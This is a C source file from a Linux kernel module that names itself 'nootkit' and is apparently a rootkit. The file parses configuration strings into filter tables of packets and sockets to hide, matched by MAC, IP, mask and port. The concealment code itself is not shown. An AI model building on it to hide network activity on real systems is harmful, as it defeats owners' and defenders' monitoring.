#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/printk.h>
#include <linux/byteorder/generic.h>

#include <config.h>

const u8 ETH_ADDR_ZERO[6] = {0};

struct config_netfilter hide_packets[MAX_HIDE_ENTITIES] = {0};
struct config_netfilter hide_sockets[MAX_HIDE_ENTITIES] = {0};

int config_parse_socket_filter(char *cs, struct config_netfilter *res)
{
    int local_ip_a = 0, local_ip_b = 0, local_ip_c = 0, local_ip_d = 0;
    int local_mask_a = 0, local_mask_b = 0, local_mask_c = 0, local_mask_d = 0;
    int foreign_ip_a = 0, foreign_ip_b = 0, foreign_ip_c = 0, foreign_ip_d = 0;
    int foreign_mask_a = 0, foreign_mask_b = 0, foreign_mask_c = 0, foreign_mask_d = 0;
    int local_port_start = 0, local_port_end = 0;
    int foreign_port_start = 0, foreign_port_end = 0;
    int ipproto = 0;
    int matches = 0;

    #define SOCKET_STR_FIELDS 21
    matches = sscanf(cs,
        " "
        "IP PROTO = %d ; "
        "LOCAL = %d.%d.%d.%d / %d.%d.%d.%d : %d - %d ; "
        "FOREIGN = %d.%d.%d.%d / %d.%d.%d.%d : %d - %d ; ",
        &ipproto,
        &local_ip_a, &local_ip_b, &local_ip_c, &local_ip_d,
        &local_mask_a, &local_mask_b, &local_mask_c, &local_mask_d,
        &local_port_start, &local_port_end,
        &foreign_ip_a, &foreign_ip_b, &foreign_ip_c, &foreign_ip_d,
        &foreign_mask_a, &foreign_mask_b, &foreign_mask_c, &foreign_mask_d,
        &foreign_port_start, &foreign_port_end);

    if (matches != SOCKET_STR_FIELDS) {
        printk(KERN_ERR "nootkit: Invalid socket filter string [%s], only %d fields matched",
            cs, matches);
        return 1;
    }

    memset(res, 0, sizeof(*res));
    res->ipproto = ipproto;
    res->src_ip = __cpu_to_be32(local_ip_d + (local_ip_c << 8) + (local_ip_b << 16) + (local_ip_a << 24));
    res->src_ip_mask = __cpu_to_be32(local_mask_d + (local_mask_c << 8) + (local_mask_b << 16) + (local_mask_a << 24));
    res->dst_ip = __cpu_to_be32(foreign_ip_d + (foreign_ip_c << 8) + (foreign_ip_b << 16) + (foreign_ip_a << 24));
    res->dst_ip_mask = __cpu_to_be32(foreign_mask_d + (foreign_mask_c << 8) + (foreign_mask_b << 16) + (foreign_mask_a << 24));
    res->src_port_start = __cpu_to_be16((u16)local_port_start);
    res->src_port_end = __cpu_to_be16((u16)local_port_end);
    res->dst_port_start = __cpu_to_be16((u16)foreign_port_start);
    res->dst_port_end = __cpu_to_be16((u16)foreign_port_end);

    return 0;
}

int config_parse_packet_filter(char *cs, struct config_netfilter *res)
{
    int eth_src1 = 0, eth_src2 = 0, eth_src3 = 0, eth_src4 = 0, eth_src5 = 0, eth_src6 = 0;
    int eth_dst1 = 0, eth_dst2 = 0, eth_dst3 = 0, eth_dst4 = 0, eth_dst5 = 0, eth_dst6 = 0;
    int local_ip_a = 0, local_ip_b = 0, local_ip_c = 0, local_ip_d = 0;
    int local_mask_a = 0, local_mask_b = 0, local_mask_c = 0, local_mask_d = 0;
    int foreign_ip_a = 0, foreign_ip_b = 0, foreign_ip_c = 0, foreign_ip_d = 0;
    int foreign_mask_a = 0, foreign_mask_b = 0, foreign_mask_c = 0, foreign_mask_d = 0;
    int src_port_start = 0, src_port_end = 0;
    int dst_port_start = 0, dst_port_end = 0;
    int ipproto = 0, ethproto = 0;
    int matches = 0;

    #define PACKET_STR_FIELDS 34
    matches = sscanf(cs,
        " "
        "ETH PROTO = %4x ; "
        "ETH SRC = %2x:%2x:%2x:%2x:%2x:%2x ; "
        "ETH DST = %2x:%2x:%2x:%2x:%2x:%2x ; "
        "IP PROTO = %d ; "
        "IP SRC = %d.%d.%d.%d / %d.%d.%d.%d : %d - %d ; "
        "IP DST = %d.%d.%d.%d / %d.%d.%d.%d : %d - %d ; ",
        &ethproto,
        &eth_src1, &eth_src2, &eth_src3, &eth_src4, &eth_src5, &eth_src6,
        &eth_dst1, &eth_dst2, &eth_dst3, &eth_dst4, &eth_dst5, &eth_dst6,
        &ipproto,
        &local_ip_a, &local_ip_b, &local_ip_c, &local_ip_d,
        &local_mask_a, &local_mask_b, &local_mask_c, &local_mask_d,
        &src_port_start, &src_port_end,
        &foreign_ip_a, &foreign_ip_b, &foreign_ip_c, &foreign_ip_d,
        &foreign_mask_a, &foreign_mask_b, &foreign_mask_c, &foreign_mask_d,
        &dst_port_start, &dst_port_end);

    if (matches != PACKET_STR_FIELDS) {
        printk(KERN_ERR "nootkit: Invalid packet filter string [%s], only %d fields matched",
            cs, matches);
        return 1;
    }

    memset(res, 0, sizeof(*res));
    res->ethproto = __cpu_to_be16(ethproto);
    res->src_eth[0] = (u8)eth_src1;
    res->src_eth[1] = (u8)eth_src2;
    res->src_eth[2] = (u8)eth_src3;
    res->src_eth[3] = (u8)eth_src4;
    res->src_eth[4] = (u8)eth_src5;
    res->src_eth[5] = (u8)eth_src6;
    res->dst_eth[0] = (u8)eth_dst1;
    res->dst_eth[1] = (u8)eth_dst2;
    res->dst_eth[2] = (u8)eth_dst3;
    res->dst_eth[3] = (u8)eth_dst4;
    res->dst_eth[4] = (u8)eth_dst5;
    res->dst_eth[5] = (u8)eth_dst6;
    res->ipproto = (u8)ipproto;
    res->src_ip = __cpu_to_be32(local_ip_d + (local_ip_c << 8) + (local_ip_b << 16) + (local_ip_a << 24));
    res->src_ip_mask = __cpu_to_be32(local_mask_d + (local_mask_c << 8) + (local_mask_b << 16) + (local_mask_a << 24));
    res->dst_ip = __cpu_to_be32(foreign_ip_d + (foreign_ip_c << 8) + (foreign_ip_b << 16) + (foreign_ip_a << 24));
    res->dst_ip_mask = __cpu_to_be32(foreign_mask_d + (foreign_mask_c << 8) + (foreign_mask_b << 16) + (foreign_mask_a << 24));
    res->src_port_start = __cpu_to_be16((u16)src_port_start);
    res->src_port_end = __cpu_to_be16((u16)src_port_end);
    res->dst_port_start = __cpu_to_be16((u16)dst_port_start);
    res->dst_port_end = __cpu_to_be16((u16)dst_port_end);

    return 0;
}

int config_parse_globals(void)
{
    int i, ret;

    for (i = 0; i < hide_packets_count; i++) {
        ret = config_parse_packet_filter(hide_packets_strs[i], &hide_packets[i]);
        if (ret)
            return ret;
    }

    for (i = 0; i < hide_sockets_count; i++) {
        ret = config_parse_socket_filter(hide_sockets_strs[i], &hide_sockets[i]);
        if (ret)
            return ret;
    }

    return 0;
}
